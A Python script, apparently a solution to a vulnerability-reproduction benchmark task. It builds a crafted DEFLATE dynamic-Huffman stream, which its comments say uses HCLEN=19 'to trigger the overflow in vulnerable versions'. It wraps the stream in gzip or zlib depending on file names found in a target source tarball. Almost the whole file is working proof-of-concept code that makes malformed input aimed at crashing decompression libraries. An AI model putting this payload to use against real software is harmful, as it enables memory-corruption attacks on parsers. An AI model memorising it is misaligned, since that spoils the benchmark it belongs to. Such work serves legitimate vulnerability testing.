import struct
import tarfile

class BitWriter:
    def __init__(self):
        self.buf = bytearray()
        self.acc = 0
        self.nbits = 0

    def write_bits(self, value, nbits):
        v = value & ((1 << nbits) - 1)
        self.acc |= (v << self.nbits)
        self.nbits += nbits
        while self.nbits >= 8:
            self.buf.append(self.acc & 0xFF)
            self.acc >>= 8
            self.nbits -= 8

    def write_flush(self):
        if self.nbits > 0:
            self.buf.append(self.acc & 0xFF)
            self.acc = 0
            self.nbits = 0

    def get_bytes(self):
        self.write_flush()
        return bytes(self.buf)

def reverse_bits(x, n):
    r = 0
    for _ in range(n):
        r = (r << 1) | (x & 1)
        x >>= 1
    return r

def build_huffman_codes(lengths_dict):
    if not lengths_dict:
        return {}
    max_len = max(lengths_dict.values()) if lengths_dict else 0
    if max_len == 0:
        return {}
    bl_count = [0] * (max_len + 1)
    for l in lengths_dict.values():
        if l > 0:
            bl_count[l] += 1
    next_code = [0] * (max_len + 1)
    code = 0
    for bits in range(1, max_len + 1):
        code = (code + bl_count[bits - 1]) << 1
        next_code[bits] = code
    codes = {}
    for sym in sorted(lengths_dict.keys()):
        l = lengths_dict[sym]
        if l != 0:
            c = next_code[l]
            next_code[l] += 1
            codes[sym] = (reverse_bits(c, l), l)
    return codes

class Solution:
    def _build_deflate_dynamic_block(self):
        # Construct a dynamic Huffman block that outputs only end-of-block (256)
        # and uses HCLEN=19 to trigger the overflow in vulnerable versions.
        w = BitWriter()
        # BFINAL=1, BTYPE=10 (dynamic)
        w.write_bits(1, 1)
        w.write_bits(2, 2)
        # HLIT=0 (257 lit/len codes), HDIST=0 (1 dist code), HCLEN=15 (19 code length codes)
        w.write_bits(0, 5)
        w.write_bits(0, 5)
        w.write_bits(15, 4)

        # Code length code order
        order = [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]

        # Define code-length code lengths: only symbols 1 and 18 have length 1
        cl_lengths = {i: 0 for i in range(19)}
        cl_lengths[1] = 1
        cl_lengths[18] = 1

        # Emit 19 3-bit values in the specified order
        for sym in order:
            w.write_bits(cl_lengths[sym], 3)

        # Build code-length Huffman codes
        cl_codes = build_huffman_codes(cl_lengths)

        def write_hclen_symbol(sym):
            code, ln = cl_codes[sym]
            w.write_bits(code, ln)

        # Now encode HLIT+257 (=257) and HDIST+1 (=1) code lengths using the code-length alphabet
        # For lit/len: 256 zeros then one '1' for symbol 256
        # Encode zeros using symbol 18 (repeat zero 11..138) with appropriate extra bits
        # First 138 zeros
        write_hclen_symbol(18)
        w.write_bits(127, 7)  # 11 + 127 = 138
        # Next 118 zeros
        write_hclen_symbol(18)
        w.write_bits(107, 7)  # 11 + 107 = 118
        # Now one '1' (for code length = 1) for symbol 256
        write_hclen_symbol(1)

        # For distance tree: single symbol with length 1
        write_hclen_symbol(1)

        # Build literal/length and distance code trees
        litlen_lengths = {i: 0 for i in range(257)}
        litlen_lengths[256] = 1  # only end-of-block symbol
        dist_lengths = {0: 1}    # one distance code (not used)

        litlen_codes = build_huffman_codes(litlen_lengths)
        # dist_codes = build_huffman_codes(dist_lengths)  # not needed as we don't use it

        # Emit end-of-block symbol 256
        code_256, ln_256 = litlen_codes[256]
        w.write_bits(code_256, ln_256)

        return w.get_bytes()

    def _build_gzip(self, deflate_bytes, uncompressed_size):
        # GZIP header (10 bytes)
        header = bytes([0x1F, 0x8B, 0x08, 0x00,  # ID1, ID2, CM=8, FLG=0
                        0x00, 0x00, 0x00, 0x00,  # MTIME=0
                        0x00, 0xFF])             # XFL=0, OS=255
        # Trailer: CRC32 and ISIZE
        # For empty output, CRC32=0, ISIZE=0
        crc32 = 0
        isize = uncompressed_size & 0xFFFFFFFF
        trailer = struct.pack("<II", crc32, isize)
        return header + deflate_bytes + trailer

    def _build_zlib(self, deflate_bytes, uncompressed_size):
        # Zlib header: 0x78 0x9C (deflate, 32K window, default compression)
        header = bytes([0x78, 0x9C])
        # Adler32 of uncompressed data; for empty output it's 1
        adler32 = 1
        trailer = struct.pack(">I", adler32)
        return header + deflate_bytes + trailer

    def solve(self, src_path: str) -> bytes:
        # Build the crafted deflate stream with dynamic Huffman and HCLEN=19
        deflate_stream = self._build_deflate_dynamic_block()
        # Uncompressed output is empty
        uncompressed_size = 0

        prefer_gzip = True
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = [m.name.lower() for m in tf.getmembers() if m is not None and m.name]
            # Heuristics to choose wrapper
            gzip_indicators = ("gzip", "gunzip", "gz", "ungzip")
            zlib_indicators = ("zlib", "png", "upng")
            has_gzip = any(any(tok in n for tok in gzip_indicators) for n in names)
            has_zlib = any(any(tok in n for tok in zlib_indicators) for n in names)
            if has_zlib and not has_gzip:
                prefer_gzip = False
        except Exception:
            # If inspection fails, default to gzip
            prefer_gzip = True

        if prefer_gzip:
            return self._build_gzip(deflate_stream, uncompressed_size)
        else:
            return self._build_zlib(deflate_stream, uncompressed_size)